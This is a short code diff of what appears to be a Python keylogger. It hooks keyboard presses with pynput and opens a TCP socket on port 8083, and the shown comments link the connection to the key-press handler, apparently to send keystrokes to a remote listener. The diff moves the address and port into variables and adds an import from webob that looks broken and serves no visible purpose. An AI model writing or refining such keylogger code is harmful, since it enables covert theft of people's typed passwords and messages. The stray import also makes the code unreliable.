@@ -1,6 +1,10 @@
 import platform,os,socket
 from pynput import keyboard
 from pynput.keyboard import Key
+from webob import year
+
+Ip = '0.0.0.0'
+Port = 8083
 
 def C_server(ip,port):
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Creating TCP-Ipv4 socket 
@@ -58,6 +62,6 @@ def wait_for_user_input():
     listener.join() # wait till listener will stop
     # other stuff 
 
-remote_host = conn_hundler(C_server('0.0.0.0',8083)) # to be used in on_press function {Remote Connection Informations}
+remote_host = conn_hundler(C_server(Ip,Port)) # to be used in on_press function {Remote Connection Informations}
 
 print(wait_for_user_input()) # main
